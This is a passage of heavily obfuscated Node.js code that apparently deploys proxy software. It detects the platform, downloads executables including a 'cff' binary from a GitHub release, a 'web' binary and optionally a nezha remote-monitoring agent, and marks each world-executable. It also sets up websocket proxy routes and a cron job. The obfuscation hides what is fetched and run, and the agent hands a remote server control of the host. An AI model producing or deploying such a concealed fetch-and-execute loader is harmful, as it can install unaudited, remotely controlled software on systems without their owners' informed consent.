_0x26a346=fs[_0x1c4951(0x12c)](_0x32e93f);request(_0x3c37b1)[_0x1c4951(0x111)](_0x26a346)['on'](_0x1c4951(0x113),function(_0x244866){const _0x2e8377=_0x1c4951;_0x244866?_0x5e6fd7(_0x2e8377(0xe9)+_0x244866):fs['chmod'](_0x32e93f,0x1ff,_0x3cca40=>{_0x3cca40?_0x5e6fd7('Failed\x20to\x20set\x20executable\x20permission\x20for\x20'+_0x27fffa+':\x20'+_0x3cca40):_0x5e6fd7(null);});});}function download_cff(_0x2f1e1c,_0x525252){const _0x4a2f11=_0x481aee,_0x2f2f94=os[_0x4a2f11(0x133)](),_0x676d3a=os[_0x4a2f11(0xb2)]();let _0x388d9c=_0x4a2f11(0x126),_0x404c60='';if(_0x2f2f94===_0x4a2f11(0x12a)){if(_0x676d3a===_0x4a2f11(0x8c))_0x404c60='https://github.com/Fscarmon/flies/releases/latest/download/cff-linux-amd64';else _0x676d3a==='arm64'&&(_0x404c60='https://github.com/Fscarmon/flies/releases/latest/download/cff-linux-arm64');}else{if(_0x2f2f94==='freebsd')_0x404c60=_0x4a2f11(0xd4);else{_0x525252(_0x4a2f11(0x77));return;}}const _0x21020d=path[_0x4a2f11(0xa1)](_0x2f1e1c,_0x388d9c);console[_0x4a2f11(0x121)](_0x4a2f11(0x101)+_0x388d9c+_0x4a2f11(0x125)+_0x21020d);let _0x391a5e=fs[_0x4a2f11(0x12c)](_0x21020d);request(_0x404c60)['pipe'](_0x391a5e)['on'](_0x4a2f11(0x113),function(_0x32869a){const _0x12226c=_0x4a2f11;_0x32869a?_0x525252(_0x12226c(0xe9)+_0x32869a):fs[_0x12226c(0x110)](_0x21020d,0x1ff,_0x194726=>{_0x194726?_0x525252('Failed\x20to\x20set\x20executable\x20permission\x20for\x20'+_0x388d9c+':\x20'+_0x194726):_0x525252(null);});});}function initializeDownloads(_0x498250,_0x2a3edd){let _0x5d300e=0x0,_0x175aed=![];const _0x3ad762=()=>{const _0x1d4d5a=_0x2745;_0x5d300e++,_0x5d300e===(nezhaser&&nezhaKey?0x3:0x2)&&(_0x175aed?console[_0x1d4d5a(0x121)](_0x1d4d5a(0x86)):console[_0x1d4d5a(0x121)](_0x1d4d5a(0x12d)),_0x2a3edd());};download_cff(_0x498250,_0x530db5=>{const _0x213ad4=_0x2745;_0x530db5?(console[_0x213ad4(0x121)](_0x213ad4(0x80)+_0x530db5),_0x175aed=!![]):console[_0x213ad4(0x121)](_0x213ad4(0x102)),_0x3ad762();}),download_web(_0x498250,_0x5ef2e9=>{const _0x33f1c7=_0x2745;_0x5ef2e9?(console[_0x33f1c7(0x121)](_0x33f1c7(0x7a)+_0x5ef2e9),_0x175aed=!![]):console['log'](_0x33f1c7(0xbc)),_0x3ad762();}),nezhaser&&nezhaKey&&download_nezha(_0x498250,_0x31242d=>{const _0x453d85=_0x2745;_0x31242d?(console[_0x453d85(0x121)](_0x453d85(0x107)+_0x31242d),_0x175aed=!![]):console[_0x453d85(0x121)](_0x453d85(0x10d)),_0x3ad762();});}async function initializeApp(){const _0x383ea4=_0x481aee;try{filePath=await findUsablePath(),console[_0x383ea4(0x121)](_0x383ea4(0x12f)+filePath);const _0x3baa6f=await setupPorts();port=_0x3baa6f[_0x383ea4(0xc0)],vmmport=_0x3baa6f[_0x383ea4(0xd5)],vmport=_0x3baa6f[_0x383ea4(0x11d)],console['log'](_0x383ea4(0xf2)+port+_0x383ea4(0xc7)+vmmport+_0x383ea4(0x130)+vmport),app[_0x383ea4(0x10f)]('/'+vmms,createProxyMiddleware({'changeOrigin':!![],'onProxyReq':function(_0x114d58,_0x5de572,_0x536887){},'pathRewrite':{['^/'+vmms]:'/'+vmms},'target':_0x383ea4(0x94)+vmmport+'/','ws':!![]})),app[_0x383ea4(0x10f)]('/'+vmpath,createProxyMiddleware({'changeOrigin':!![],'onProxyReq':function(_0x5bc217,_0x4bcfd2,_0x5e7e82){},'pathRewrite':{['^/'+vmpath]:'/'+vmpath},'target':_0x383ea4(0x94)+vmport+'/','ws':!![]})),initializeDownloads(filePath,()=>{checkProcesses(),startCheckingProcesses(),setTimeout(()=>{initializeData(),sub_url&&startCronJob();},0x2710);}),app['listen'](port,()=>{const _0x594382=_0x383ea4;console[_0x594382(0x121)](_0x594382(0x98)+port+_0x594382(0xb6));});}catch(_0x2cab6c){console[_0x383ea4(0x10b)](_0x383ea4(0xd8),_0x2cab6c),process['exit'](0x1);}}initializeApp()[_0x481aee(0xc9)](_0x12ea67=>{const _0x296db5=_0x481aee;console['error'](_0x296db5(0x10a),_0x12ea67),process['exit'](0x1);});